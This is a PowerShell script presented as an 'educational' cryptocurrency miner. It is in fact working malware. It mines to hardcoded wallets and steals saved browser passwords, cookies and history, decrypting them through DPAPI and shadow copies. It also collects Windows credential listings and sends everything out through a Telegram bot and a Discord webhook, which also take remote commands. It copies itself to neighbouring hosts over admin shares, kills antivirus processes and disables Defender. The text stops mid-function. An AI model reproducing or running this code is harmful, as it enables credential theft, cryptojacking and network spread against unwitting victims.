# Enhanced Mining Script with Advanced Features
# WARNING: For educational purposes in a controlled environment ONLY.
# Unauthorized use is ILLEGAL and UNETHICAL.

#Requires -RunAsAdministrator

Add-Type -AssemblyName System.Windows.Forms, System.Security -ErrorAction SilentlyContinue
[System.Windows.Forms.Application]::EnableVisualStyles()

# Paths and Config
$baseDir = "${env:APPDATA}\AdvancedMiner"
$logFile = "$baseDir\mining_log.txt"
$miningScriptPath = "$baseDir\mining.ps1"
$miningScriptUrl = "https://raw.githubusercontent.com/Azulprojets/shubabes/main/mining.ps1"
$configFile = "$baseDir\config.json"
$credentialsFile = "$baseDir\credentials.json"
$historyFile = "$baseDir\history.json"
$cookiesFile = "$baseDir\cookies.json"
$sqlite3Path = "$baseDir\sqlite3.exe"
$sqlite3Url = "https://www.sqlite.org/2023/sqlite-tools-win32-x86-3430100.zip"

# Environment Variables
${env:GPU_WALLET} = "0x6D8E80004900a938b518e1aA01fDdB384a089F1E"
${env:XMR_WALLET} = "4B7F3tuKdQVNB7QMoyfvG62EEqHEKV4iQWfZH5RAA5uz3STSWchWQ9dH8Jt9P6woRCP1UYX58HxPZW4BqdZ7v2ETLkYi1D5"
${env:TON_WALLET} = "UQDg4WHFrh5CagHuodkhfzrlFtW_nCyCpq_hD763gb6yhOC0"

# Script Variables
$script:lastHashrate = 0
$script:totalEarnings = 0
$script:overheatCount = 0
$script:currentAlgorithm = "Ethash"
$script:currentCoin = "ETH"
$script:currentPool = ""
$script:lastSwitchTime = Get-Date
$script:lastBestCoin = $null
$script:lastUpdateCheck = Get-Date
$script:isMining = $false
$script:temperatureHistory = @()
$script:profitHistory = @()
$script:lastTelegramSend = (Get-Date).AddSeconds(-10)
$script:notificationQueue = New-Object System.Collections.Queue

# Global Config Variables
$global:telegramBotToken = $null
$global:telegramChatId = $null
$global:discordWebhookUrl = $null
$global:supportedAlgorithms = @{}

# Initialize Directory
if (-not (Test-Path $baseDir)) { New-Item -Path $baseDir -ItemType Directory -Force | Out-Null }

# Logging
function Write-Log {
    param ($Message)
    $logEntry = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - $Message"
    try { 
        $logEntry | Out-File -FilePath $logFile -Append -Encoding UTF8 -ErrorAction Stop 
    } catch { 
        Write-Host "Failed to write to log: $_"
        Write-Host $logEntry 
    }
    Write-Host $logEntry
}

# File Copying
function Copy-LockedFile {
    param ($Source, $Dest)
    try {
        Copy-Item -Path $Source -Destination $Dest -Force -ErrorAction Stop
        Write-Log "Direct copy successful: $Source to $Dest"
        return $null
    } catch {
        if ($_.Exception -is [System.IO.IOException]) {
            $volume = [System.IO.Path]::GetPathRoot($Source)
            try {
                $vssService = Get-Service -Name "VSS" -ErrorAction SilentlyContinue
                if (-not $vssService -or $vssService.Status -ne "Running") {
                    Write-Log "VSS service unavailable, skipping shadow copy."
                    throw "VSS not available."
                }
                $class = Get-CimClass -ClassName Win32_ShadowCopy
                $result = Invoke-CimMethod -CimClass $class -MethodName Create -Arguments @{ Volume = $volume; Context = "ClientAccessible" }
                if ($result.ReturnValue -ne 0) { throw "VSS creation failed: $($result.ReturnValue)" }
                $shadowCopy = Get-CimInstance -ClassName Win32_ShadowCopy | Where-Object { $_.ID -eq $result.ShadowID }
                $shadowPath = Join-Path $shadowCopy.DeviceObject ($Source -replace [regex]::Escape($volume), "").TrimStart("\")
                if (-not (Test-Path $shadowPath)) { throw "File not found in VSS: $shadowPath" }
                Copy-Item -Path $shadowPath -Destination $Dest -Force -ErrorAction Stop
                Write-Log "VSS copy successful: $Dest"
                return $shadowCopy
            } catch {
                Write-Log "VSS copy failed: $_"
                throw
            }
        } else {
            Write-Log "Copy failed: $_"
            throw
        }
    }
}

# Credential Decryption
function Unprotect-ChromePassword {
    param ($EncryptedData, $Key)
    try {
        if (-not $EncryptedData -or $EncryptedData.Length -lt 28) { return "Invalid Data" }
        if (-not $Key) { return "No Key" }
        if ([System.Text.Encoding]::UTF8.GetString($EncryptedData[0..2]) -ne "v10") { return "Legacy Encryption" }
        $nonce = $EncryptedData[3..14]
        $cipherText = $EncryptedData[15..($EncryptedData.Length - 17)]
        $tag = $EncryptedData[($EncryptedData.Length - 16)..($EncryptedData.Length - 1)]
        $aes = [System.Security.Cryptography.AesGcm]::new($Key)
        $plainTextBytes = New-Object byte[] $cipherText.Length
        $aes.Decrypt($nonce, $cipherText, $tag, $plainTextBytes)
        $result = [System.Text.Encoding]::UTF8.GetString($plainTextBytes).TrimEnd([char]0)
        if ($result -match "[^\x20-\x7E]") { return "Corrupted Data" }
        return $result
    } catch {
        Write-Log "Decryption error: $_"
        return "Decryption Error"
    }
}

function Get-ChromeEncryptionKey {
    $localStatePath = "${env:LOCALAPPDATA}\Google\Chrome\User Data\Local State"
    if (-not (Test-Path $localStatePath)) { return $null }
    try {
        $localStateRaw = Get-Content $localStatePath -Raw -ErrorAction Stop
        if (-not $localStateRaw) { throw "Local State file is empty." }
        $localState = $localStateRaw | ConvertFrom-Json -ErrorAction Stop
        if (-not $localState.os_crypt.encrypted_key) { throw "No encrypted key in Local State." }
        $encryptedKey = [Convert]::FromBase64String($localState.os_crypt.encrypted_key)[5..($localState.os_crypt.encrypted_key.Length - 1)]
        return [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    } catch {
        Write-Log "Key decryption failed: $_"
        return $null
    }
}

# Browser Harvesting
function Get-ChromeHistory {
    Write-Log "Extracting Chrome history..."
    $historyPath = "${env:LOCALAPPDATA}\Google\Chrome\User Data\Default\History"
    $tempHistory = "${env:TEMP}\ChromeHistory.db"
    if (-not (Test-Path $historyPath)) {
        Write-Log "Chrome history missing."
        return
    }
    try {
        $shadowCopy = Copy-LockedFile -Source $historyPath -Dest $tempHistory
        if (-not (Test-Path $sqlite3Path)) { throw "sqlite3.exe missing." }
        $lastTimestamp = if (Test-Path $historyFile) {
            try {
                $historyJson = Get-Content $historyFile -ErrorAction Stop | ConvertFrom-Json -ErrorAction Stop
                ($historyJson | Select-Object -Last 1).Timestamp
            } catch {
                Write-Log "Invalid history.json: $_"
                "1970-01-01"
            }
        } else { "1970-01-01" }
        $query = "SELECT url, title, visit_count FROM urls WHERE last_visit_time > (SELECT strftime('%s', '$lastTimestamp')) ORDER BY last_visit_time DESC LIMIT 50"
        $output = & $sqlite3Path $tempHistory $query -separator '|' -csv
        $historyItems = if (Test-Path $historyFile) { 
            try { Get-Content $historyFile -ErrorAction Stop | ConvertFrom-Json -ErrorAction Stop } catch { @() }
        } else { @() }
        $newItems = foreach ($line in ($output -split "`n")) {
            if (-not $line) { continue }
            $fields = $line -split '\|'
            if ($fields.Count -lt 3) { continue }
            $entry = "Chrome History: $($fields[0]) - $($fields[1]) (Visits: $($fields[2]))"
            Send-TelegramMessage -Message $entry -Priority 1
            Send-DiscordWebhook -Message $entry -Priority 1
            [PSCustomObject]@{
                URL        = $fields[0]
                Title      = $fields[1]
                VisitCount = $fields[2]
                Timestamp  = (Get-Date).ToString()
            }
        }
        $historyItems += $newItems
        $historyItems | ConvertTo-Json -Depth 10 | Out-File $historyFile -ErrorAction Stop
        Write-Log "Chrome history processed."
    } catch {
        Write-Log "Chrome history failed: $_"
    } finally {
        Remove-Item $tempHistory -ErrorAction SilentlyContinue
        if ($shadowCopy) { 
            try { $shadowCopy.Delete() } catch { Write-Log "Failed to delete shadow copy: $_" }
        }
    }
}

function Get-ChromeCookies {
    Write-Log "Extracting Chrome cookies..."
    $cookiesPath = "${env:LOCALAPPDATA}\Google\Chrome\User Data\Default\Network\Cookies"
    $tempCookies = "${env:TEMP}\ChromeCookies.db"
    if (-not (Test-Path $cookiesPath)) {
        Write-Log "Chrome cookies missing."
        return
    }
    try {
        $shadowCopy = Copy-LockedFile -Source $cookiesPath -Dest $tempCookies
        if (-not (Test-Path $sqlite3Path)) { throw "sqlite3.exe missing." }
        $lastTimestamp = if (Test-Path $cookiesFile) {
            try {
                $cookiesJson = Get-Content $cookiesFile -ErrorAction Stop | ConvertFrom-Json -ErrorAction Stop
                ($cookiesJson | Select-Object -Last 1).Timestamp
            } catch {
                Write-Log "Invalid cookies.json: $_"
                "1970-01-01"
            }
        } else { "1970-01-01" }
        $query = "SELECT host_key, name, encrypted_value FROM cookies WHERE last_access_utc > (SELECT strftime('%s', '$lastTimestamp'))"
        $output = & $sqlite3Path $tempCookies $query -separator '|' -csv
        $encryptionKey = Get-ChromeEncryptionKey
        if (-not $encryptionKey) { return }
        $cookies = if (Test-Path $cookiesFile) { 
            try { Get-Content $cookiesFile -ErrorAction Stop | ConvertFrom-Json -ErrorAction Stop } catch { @() }
        } else { @() }
        $newCookies = foreach ($line in ($output -split "`n")) {
            if (-not $line) { continue }
            $fields = $line -split '\|'
            if ($fields.Count -lt 3) { continue }
            $value = if ($fields[2] -match "^v10") {
                $encryptedData = [System.Text.Encoding]::UTF8.GetBytes($fields[2].Substring(3))
                Unprotect-ChromePassword -EncryptedData $encryptedData -Key $encryptionKey
            } else { $fields[2] }
            $message = "Chrome Cookie - Host: $($fields[0]), Name: $($fields[1]), Value: $value"
            Send-TelegramMessage -Message $message -Priority 1
            Send-DiscordWebhook -Message $message -Priority 1
            [PSCustomObject]@{
                Host      = $fields[0]
                Name      = $fields[1]
                Value     = $value
                Timestamp = (Get-Date).ToString()
            }
        }
        $cookies += $newCookies
        $cookies | ConvertTo-Json -Depth 10 | Out-File $cookiesFile -ErrorAction Stop
        Write-Log "Chrome cookies processed."
    } catch {
        Write-Log "Chrome cookies failed: $_"
    } finally {
        Remove-Item $tempCookies -ErrorAction SilentlyContinue
        if ($shadowCopy) { 
            try { $shadowCopy.Delete() } catch { Write-Log "Failed to delete shadow copy: $_" }
        }
    }
}

# Notifications
function Send-TelegramMessage {
    param ($Message, $Priority = 1)
    if ([string]::IsNullOrEmpty($global:telegramChatId)) {
        Write-Log "Error: Telegram chat ID is null or empty. Cannot send message."
        return
    }
    if ($script:notificationQueue.Count -ge 1000) {
        Write-Log "Notification queue full, clearing oldest."
        $script:notificationQueue.Dequeue()
    }
    $script:notificationQueue.Enqueue(@{ Type = "Telegram"; Message = $Message; Priority = $Priority; Timestamp = Get-Date })
}

function Send-TelegramFile {
    param ($FilePath, $Priority = 1)
    if ([string]::IsNullOrEmpty($global:telegramChatId)) {
        Write-Log "Error: Telegram chat ID is null or empty. Cannot send file."
        return
    }
    if ($script:notificationQueue.Count -ge 1000) {
        Write-Log "Notification queue full, clearing oldest."
        $script:notificationQueue.Dequeue()
    }
    $script:notificationQueue.Enqueue(@{ Type = "TelegramFile"; FilePath = $FilePath; Priority = $Priority; Timestamp = Get-Date })
}

function Send-DiscordWebhook {
    param ($Message, $Priority = 1, $Embeds = $null)
    if ([string]::IsNullOrEmpty($global:discordWebhookUrl)) {
        Write-Log "Error: Discord webhook URL is null or empty. Cannot send message."
        return
    }
    if ($script:notificationQueue.Count -ge 1000) {
        Write-Log "Notification queue full, clearing oldest."
        $script:notificationQueue.Dequeue()
    }
    $script:notificationQueue.Enqueue(@{ Type = "Discord"; Message = $Message; Embeds = $Embeds; Priority = $Priority; Timestamp = Get-Date })
}

function Invoke-NotificationQueue {
    Write-Log "Processing notification queue..."
    $queue = $script:notificationQueue.ToArray() | Sort-Object { if ($_.Priority -eq 1) { 0 } else { 1 } }, Timestamp
    $script:notificationQueue.Clear()
    foreach ($item in $queue) {
        try {
            if (((Get-Date) - $script:lastTelegramSend).TotalSeconds -lt 5 -and $item.Priority -ne 1) {
                $script:notificationQueue.Enqueue($item)
                continue
            }
            switch ($item.Type) {
                "Telegram" {
                    $url = "https://api.telegram.org/bot$global:telegramBotToken/sendMessage"
                    $message = $item.Message -replace "[\x00-\x1F]", ""
                    if ($message.Length -gt 4096) {
                        $chunks = for ($i = 0; $i -lt $message.Length; $i += 4096) { $message.Substring($i, [Math]::Min(4096, $message.Length - $i)) }
                        foreach ($chunk in $chunks) {
                            Invoke-RestMethod -Uri $url -Method Post -Body @{ chat_id = $global:telegramChatId; text = $chunk; parse_mode = "Markdown" } -ErrorAction Stop
                        }
                    } else {
                        Invoke-RestMethod -Uri $url -Method Post -Body @{ chat_id = $global:telegramChatId; text = $message; parse_mode = "Markdown" } -ErrorAction Stop
                    }
                    $script:lastTelegramSend = Get-Date
                    Write-Log "Telegram sent."
                }
                "TelegramFile" {
                    $filePath = $item.FilePath
                    if (-not (Test-Path $filePath) -or (Get-Item $filePath).Length -eq 0) {
                        Write-Log "Skipping file upload: $filePath missing or empty."
                        continue
                    }
                    $url = "https://api.telegram.org/bot$global:telegramBotToken/sendDocument"
                    $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
                    $fileName = [System.IO.Path]::GetFileName($filePath)
                    $boundary = [System.Guid]::NewGuid().ToString()
                    $bodyLines = @(
                        "--$boundary",
                        "Content-Disposition: form-data; name=`"chat_id`"",
                        "",
                        "$global:telegramChatId",
                        "--$boundary",
                        "Content-Disposition: form-data; name=`"document`"; filename=`"$fileName`"",
                        "Content-Type: application/octet-stream",
                        "",
                        [System.Text.Encoding]::UTF8.GetString($fileBytes),
                        "--$boundary--"
                    )
                    $body = [string]::Join("`r`n", $bodyLines)
                    Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body -ErrorAction Stop
                    Write-Log "Telegram file sent: $filePath"
                }
                "Discord" {
                    $payload = if ($item.Embeds) { 
                        @{ embeds = $item.Embeds } | ConvertTo-Json -Depth 10 
                    } else { 
                        @{ embeds = @(@{ title = "Notification"; description = $item.Message; color = 3447003; timestamp = (Get-Date).ToString("o") }) } | ConvertTo-Json -Depth 4 
                    }
                    Invoke-RestMethod -Uri $global:discordWebhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction Stop
                    Write-Log "Discord sent."
                }
            }
        } catch {
            Write-Log "Notification failed: $_"
            if (((Get-Date) - $item.Timestamp).TotalMinutes -lt 5) { 
                if ($script:notificationQueue.Count -lt 1000) { 
                    $script:notificationQueue.Enqueue($item) 
                }
            }
        }
    }
}

# Telegram Listener
function Start-TelegramListener {
    Write-Log "Starting Telegram listener..."
    $lastOffset = 0
    $commandHistory = @{}
    while ($true) {
        try {
            if ([string]::IsNullOrEmpty($global:telegramChatId)) {
                Write-Log "Error: Telegram chat ID is null or empty."
                Start-Sleep -Seconds 10
                continue
            }
            $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$global:telegramBotToken/getUpdates?offset=$lastOffset" -ErrorAction Stop
            foreach ($update in $updates.result) {
                $lastOffset = $update.update_id + 1
                $message = $update.message.text
                $chatId = $update.message.chat.id
                if ($chatId -ne $global:telegramChatId) { continue }
                if ($message -notmatch "^/") { continue }
                Write-Log "Received: $message"
                $commandHistory[$message] = ($commandHistory[$message] ?? 0) + 1
                switch ($message) {
                    "/startmining" {
                        if (-not $script:isMining) {
                            Initialize-Miners
                            $script:isMining = $true
                            Send-TelegramMessage -Message "Mining started." -Priority 1
                        } else {
                            Send-TelegramMessage -Message "Mining already running."
                        }
                    }
                    "/stopmining" {
                        if ($script:isMining) {
                            Stop-Miner
                            $script:isMining = $false
                            Send-TelegramMessage -Message "Mining stopped." -Priority 1
                        } else {
                            Send-TelegramMessage -Message "Mining not running."
                        }
                    }
                    "/status" {
                        $status = Get-MiningStatus
                        $msg = "*Mining Status*`n`n**Algorithm**: $($status.Algorithm)`n**Hashrate**: $($status.Hashrate)`n**Earnings**: $($status.Earnings)`n**GPU Temp**: $($status.GPUTemp)`n**Power Usage**: $($status.PowerUsage)`n**Pool Latency**: $($status.PoolLatency)`n**Coin**: $($status.CurrentCoin)`n**Pool**: $($status.CurrentPool)"
                        Send-TelegramMessage -Message $msg
                    }
                    "/getcreds" {
                        $creds = Get-Credentials
                        if ($creds) {
                            $telegramMsg = "*Extracted Credentials*`n`n"
                            $discordEmbeds = @()
                            foreach ($cred in ($creds | Sort-Object Source, Timestamp)) {
                                $telegramMsg += "🔒 **$($cred.Source)**`n- URL: $($cred.URL)`n- Username: $($cred.Username)`n- Password: $($cred.Password)`n- Time: $($cred.Timestamp)`n`n"
                                $discordEmbeds += @{
                                    title = "$($cred.Source) Credential"
                                    fields = @(
                                        @{ name = "URL"; value = $cred.URL; inline = $true }
                                        @{ name = "Username"; value = $cred.Username; inline = $true }
                                        @{ name = "Password"; value = $cred.Password; inline = $true }
                                        @{ name = "Timestamp"; value = $cred.Timestamp; inline = $false }
                                    )
                                    color = 5814783
                                }
                            }
                            $creds | ConvertTo-Json -Depth 10 | Out-File $credentialsFile -ErrorAction Stop
                            Send-TelegramMessage -Message $telegramMsg -Priority 1
                            Send-DiscordWebhook -Embeds $discordEmbeds -Priority 1
                            Send-TelegramFile -FilePath $credentialsFile -Priority 1
                        } else {
                            Send-TelegramMessage -Message "No credentials found." -Priority 1
                            Send-DiscordWebhook -Message "No credentials found." -Priority 1
                        }
                        $winCreds = cmdkey /list
                        $outputFile = "${env:TEMP}\WinCredMan.txt"
                        try {
                            if ($winCreds -and ($winCreds -join "").Trim()) {
                                $winCredMsg = "*Windows Credentials*`n`n``````n$($winCreds | Out-String)`n``````"
                                $winCreds | Out-String | Out-File $outputFile -Encoding UTF8 -ErrorAction Stop
                                Send-TelegramMessage -Message $winCredMsg -Priority 1
                                Send-DiscordWebhook -Embeds @(@{ title = "Windows Credentials"; description = "``````n$($winCreds | Out-String)`n``````"; color = 5814783; timestamp = (Get-Date).ToString("o") }) -Priority 1
                                Send-TelegramFile -FilePath $outputFile -Priority 1
                            } else {
                                Send-TelegramMessage -Message "No Windows credentials found." -Priority 1
                                Send-DiscordWebhook -Message "No Windows credentials found." -Priority 1
                            }
                        } finally {
                            Remove-Item $outputFile -ErrorAction SilentlyContinue
                        }
                    }
                    "/reboot" {
                        Send-TelegramMessage -Message "Rebooting..." -Priority 1
                        Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -NoNewWindow
                        exit
                    }
                    "/shutdown" {
                        Send-TelegramMessage -Message "Shutting down..." -Priority 1
                        exit
                    }
                    default {
                        $suggested = ($commandHistory.GetEnumerator() | Sort-Object Value -Descending | Select-Object -First 1).Key ?? "/status"
                        Send-TelegramMessage -Message "Unknown command. Did you mean $suggested? Available: /startmining, /stopmining, /status, /getcreds, /reboot, /shutdown"
                    }
                }
            }
        } catch {
            Write-Log "Telegram listener error: $_"
            Start-Sleep -Seconds 10
        }
        Invoke-NotificationQueue
        Start-Sleep -Seconds 3
    }
}

# Credential Extraction
function Get-Credentials {
    $creds = @()
    $browsers = @(
        @{ Name = "Chrome"; Path = "${env:LOCALAPPDATA}\Google\Chrome\User Data\Default\Login Data" },
        @{ Name = "Edge"; Path = "${env:LOCALAPPDATA}\Microsoft\Edge\User Data\Default\Login Data" },
        @{ Name = "Opera"; Path = "${env:APPDATA}\Opera Software\Opera Stable\Login Data" },
        @{ Name = "Brave"; Path = "${env:LOCALAPPDATA}\BraveSoftware\Brave-Browser\User Data\Default\Login Data" }
    )
    $firefoxPath = "${env:APPDATA}\Mozilla\Firefox\Profiles"

    foreach ($browser in ($browsers | Where-Object { Test-Path $_.Path } | Sort-Object { (Get-Item $_.Path).LastWriteTime } -Descending)) {
        try {
            $tempDb = "${env:TEMP}\$($browser.Name)LoginData.db"
            Copy-LockedFile $browser.Path $tempDb
            if (-not (Test-Path $sqlite3Path)) { Write-Log "sqlite3.exe missing."; continue }
            $output = & $sqlite3Path $tempDb "SELECT origin_url, username_value, password_value FROM logins WHERE username_value != ''" -separator '|' -csv
            $key = Get-ChromeEncryptionKey
            if (-not $key) { Write-Log "No key for $($browser.Name)."; continue }
            foreach ($line in ($output -split "`n")) {
                if (-not $line) { continue }
                $fields = $line -split '\|'
                if ($fields.Count -lt 3) { continue }
                $url, $username, $passwordValue = $fields[0], $fields[1], $fields[2]
                $password = if ($passwordValue -match "^v10") {
                    $encryptedData = [System.Text.Encoding]::UTF8.GetBytes($passwordValue.Substring(3))
                    Unprotect-ChromePassword $encryptedData $key
                } else { "Legacy Encryption" }
                if ($password -match "Invalid|Corrupted|Error|No Key" -or $url -match "[^\x20-\x7E]" -or $username -match "[^\x20-\x7E]") { continue }
                $creds += [PSCustomObject]@{
                    Source    = $browser.Name
                    URL       = $url
                    Username  = $username
                    Password  = $password
                    Timestamp = (Get-Date).ToString()
                }
            }
            Write-Log "$($browser.Name) credentials extracted."
        } catch {
            Write-Log "$($browser.Name) extraction failed: $_"
        } finally {
            Remove-Item $tempDb -ErrorAction SilentlyContinue
        }
    }

    if (Test-Path $firefoxPath) {
        try {
            $profileDir = Get-ChildItem $firefoxPath -Directory | Select-Object -First 1
            $loginsFile = "$($profileDir.FullName)\logins.json"
            $tempLogins = "${env:TEMP}\FirefoxLogins.json"
            if (Test-Path $loginsFile) {
                Copy-LockedFile $loginsFile $tempLogins
                $loginsRaw = Get-Content $tempLogins -Raw -ErrorAction Stop
                if (-not $loginsRaw) { throw "Firefox logins.json is empty." }
                $logins = $loginsRaw | ConvertFrom-Json -ErrorAction Stop
                foreach ($login in $logins.logins) {
                    $creds += [PSCustomObject]@{
                        Source    = "Firefox"
                        URL       = $login.hostname
                        Username  = $login.encryptedUsername
                        Password  = $login.encryptedPassword
                        Timestamp = (Get-Date).ToString()
                    }
                }
                Write-Log "Firefox credentials extracted."
            }
        } catch {
            Write-Log "Firefox extraction failed: $_"
        } finally {
            Remove-Item $tempLogins -ErrorAction SilentlyContinue
        }
    }

    return $creds
}

# Self-Replication
function Start-SelfReplication {
    Write-Log "Initiating self-replication..."
    try {
        $baseIp = (Get-NetIPAddress | Where-Object { $_.AddressFamily -eq "IPv4" -and $_.InterfaceAlias -notlike "*Loopback*" }).IPAddress -replace "\.\d+$", ""
        $tasks = 1..5 | ForEach-Object {
            $ip = "$baseIp.$_"
            [PSCustomObject]@{
                IP = $ip
                Task = Start-Job -ScriptBlock {
                    param ($ip)
                    if (Test-Connection $ip -Count 1 -Quiet) {
                        $share = "\\$ip\ADMIN$"
                        Copy-Item -Path $using:miningScriptPath -Destination "$share\mining.ps1" -Force -ErrorAction SilentlyContinue
                        Invoke-Command -ComputerName $ip -ScriptBlock { powershell.exe -File "C:\Windows\mining.ps1" } -ErrorAction SilentlyContinue
                        "Replicated to $ip"
                    }
                } -ArgumentList $ip
            }
        }
        $tasks | ForEach-Object { 
            $result = Wait-Job $_.Task -Timeout 30 | Receive-Job
            if ($result) { Write-Log $result }
        }
        Write-Log "Self-replication completed."
    } catch {
        Write-Log "Self-replication failed: $_"
    } finally {
        $tasks | ForEach-Object { Remove-Job $_.Task -Force }
    }
}

# Security and Sleep Prevention
function Disable-WindowsSecurity {
    Write-Log "Disabling security..."
    try {
        Get-Service -Name "*McAfee*", "*Norton*", "*Kaspersky*", "*Avast*", "*Bitdefender*" | 
            Where-Object { $_.Status -eq "Running" } | 
            ForEach-Object { Stop-Process -Name $_.Name -Force -ErrorAction SilentlyContinue }
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionPath $baseDir -ErrorAction SilentlyContinue
        Write-Log "Security disabled."
    } catch {
        Write-Log "Security disable failed: $_"
    }
}

function Set-SleepPrevention {
    Write-Log "Preventing sleep..."
    try {
        Add-Type -TypeDefinition @'
        using System.Runtime.InteropServices;
        public class Power {
            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern uint SetThreadExecutionState(uint esFlags);
            public const uint ES_CONTINUOUS = 0x80000000;
            public const uint ES_SYSTEM_REQUIRED = 0x00000001;
        }
'@
        [Power]::SetThreadExecutionState([Power]::ES_CONTINUOUS -bor [Power]::ES_SYSTEM_REQUIRED)
        Write-Log "Sleep prevention enabled."
    } catch {
        Write-Log "Sleep prevention failed: $_"
    }
}

# Coin Selection and Pool Management
function Get-MostProfitableCoin {
    Write-Log "Fetching profitable coin..."
    try {
        $profitData = $null
        for ($i = 0; $i -lt 3; $i++) {
            try {
                $profitData = Invoke-RestMethod -Uri "https://whattomine.com/coins.json" -TimeoutSec 10 -ErrorAction Stop
                break
            } catch {
                Write-Log "Profit data fetch attempt $($i + 1) failed: $_"
                if ($i -eq 2) { 
                    Write-Log "All retries failed, using fallback coin."
                    break
                }
                Start-Sleep -Seconds ([Math]::Pow(2, $i + 1))
            }
        }
        if (-not $profitData) {
            if ($script:lastBestCoin -and ((Get-Date) - $script:lastBestCoin.Timestamp).TotalHours -lt 1) {
                Write-Log "Using last best coin: $($script:lastBestCoin.Coin.tag)"
                return $script:lastBestCoin.Coin
            }
            Write-Log "No profit data, defaulting to ETH."
            return [PSCustomObject]@{ tag = "ETH"; algorithm = "Ethash"; profitability = 1 }
        }
        $coins = $profitData.psobject.Properties.Value | Where-Object { $_.algorithm -in $global:supportedAlgorithms.Keys }
        if (-not $coins) { throw "No valid coins." }
        $script:profitHistory += $coins | ForEach-Object { [PSCustomObject]@{ Tag = $_.tag; Profit = $_.profitability24; Timestamp = Get-Date } }
        $script:profitHistory = $script:profitHistory | Where-Object { $_.Timestamp -gt (Get-Date).AddHours(-24) }
        $results = @()
        foreach ($coin in $coins) {
            $history = $script:profitHistory | Where-Object { $_.Tag -eq $coin.tag }
            $trend = if ($history.Count -gt 1) { ($history[-1].Profit - $history[0].Profit) / $history.Count } else { 0 }
            $results += [PSCustomObject]@{ Coin = $coin; Score = ($coin.profitability24 * 0.9 + $trend * 0.1) }
        }
        $bestCoin = if ($results) { $results | Sort-Object Score -Descending | Select-Object -First 1 } else { $null }
        if (-not $bestCoin) { throw "No coin selected." }
        Write-Log "Best coin: $($bestCoin.Coin.tag)"
        $script:lastBestCoin = @{ Coin = $bestCoin.Coin; Timestamp = Get-Date }
        return $bestCoin.Coin
    } catch {
        Write-Log "Coin selection failed: $_"
        if ($script:lastBestCoin -and ((Get-Date) - $script:lastBestCoin.Timestamp).TotalHours -lt 1) {
            Write-Log "Using last best coin: $($script:lastBestCoin.Coin.tag)"
            return $script:lastBestCoin.Coin
        }
        Write-Log "Defaulting to ETH."
        return [PSCustomObject]@{ tag = "ETH"; algorithm = "Ethash"; profitability = 1 }
    }
}

function Get-BestPool {
    param ($Algorithm)
    Write-Log "Selecting pool for $Algorithm..."
    $pools = @{
        "Ethash"   = @("stratum+tcp://etc.2miners.com:1010", "stratum+tcp://eth.nanopool.org:9999")
        "KawPow"   = @("stratum+tcp://rvn.2miners.com:6060", "stratum+tcp://rvn.nanopool.org:12222")
        "RandomX"  = @("stratum+tcp://xmr.pool.minergate.com:443", "stratum+tcp://pool.hashvault.pro:5555")
        "Autolykos"= @("stratum+tcp://ergo.2miners.com:8888", "stratum+tcp://ergo.nanopool.org:11111")
    }
    if ($pools[$Algorithm]) {
        $bestPool = $pools[$Algorithm] | ForEach-Object {
            $pool = $_
            $hostName = ($pool -replace "stratum\+tcp://", "") -split ":" | Select-Object -First 1
            $start = Get-Date
            $test = Test-NetConnection $hostName -Port 443 -WarningAction SilentlyContinue
            [PSCustomObject]@{
                Pool = $pool
                Latency = if ($test.TcpTestSucceeded) { [int](((Get-Date) - $start).TotalMilliseconds) } else { 9999 }
            }
        } | Sort-Object Latency | Select-Object -First 1
        Write-Log "Selected pool: $($bestPool.Pool)"
        return $bestPool.Pool
    }
    Write-Log "Defaulting to hashvault."
    return "stratum+tcp://pool.hashvault.pro:5555"
}

# Overclocking
function Set-GPUOverclock {
    Write-Log "Optimizing GPU..."
    try {
        $nvidiaSmi = "C:\Program Files\NVIDIA Corporation\NVSMI\nvidia-smi.exe"
        if (-not (Test-Path $nvidiaSmi)) { 
            Write-Log "nvidia-smi not found."
            return 
        }
        $tempOutput = & $nvidiaSmi --query-gpu=temperature.gpu --format=csv,noheader
        $temp = if ($tempOutput -match '^\d+$') { [int]$tempOutput } else { 50 }
        $powerOutput = & $nvidiaSmi --query-gpu=power.draw --format=csv,noheader,nounits
        $power = if ($powerOutput -match '^\d+(\.\d+)?$') { [int]$powerOutput } else { 0 }
        $script:temperatureHistory += @{ Temp = $temp; Timestamp = Get-Date }
        $script:temperatureHistory = $script:temperatureHistory | Where-Object { $_.Timestamp -gt (Get-Date).AddMinutes(-30) }
        $avgTemp = if ($script:temperatureHistory) { ($script:temperatureHistory.Temp | Measure-Object -Average).Average } else { $temp }
        $limitOutput = & $nvidiaSmi --query-gpu=power.limit --format=csv,noheader,nounits
        $currentLimit = if ($limitOutput -match '^\d+(\.\d+)?$') { [int]$limitOutput } else { 100 }
        if ($avgTemp -gt 80) {
            $newLimit = [Math]::Max($currentLimit - 10, 50)
            & $nvidiaSmi -pl $newLimit
            Write-Log "Reduced power to $newLimit W (Temp: $avgTemp°C)"
        } elseif ($avgTemp -lt 70) {
            $newLimit = [Math]::Min($currentLimit + 10, 100)
            & $nvidiaSmi -pl $newLimit
            Write-Log "Increased power to $newLimit W (Temp: $avgTemp°C)"
        }
    } catch {
        Write-Log "Overclocking failed: $_"
    }
}

# Miner Management
function Install-Miner {
    param ($Name, $Url, $Path)
    Write-Log "Installing $Name..."
    try {
        if (-not (Test-Path $Path)) { New-Item -Path $Path -ItemType Directory -Force | Out-Null }
        $exePath = "$Path\$Name.exe"
        if (-not (Test-Path $exePath)) {
            $zipPath = "${env:TEMP}\$Name.zip"
            try {
                Invoke-WebRequest -Uri $Url -OutFile $zipPath -UseBasicParsing -ErrorAction Stop
                Expand-Archive $zipPath $Path -Force -ErrorAction Stop
                $exe = Get-ChildItem $Path -Filter "$Name.exe" -Recurse | Select-Object -First 1
                if (-not $exe) { throw "Executable not found for $Name." }
                Move-Item $exe.FullName $exePath -Force
            } finally {
                Remove-Item $zipPath -ErrorAction SilentlyContinue
            }
        }
        Write-Log "$Name ready."
        return $exePath
    } catch {
        Write-Log "Install failed: $_"
        return $null
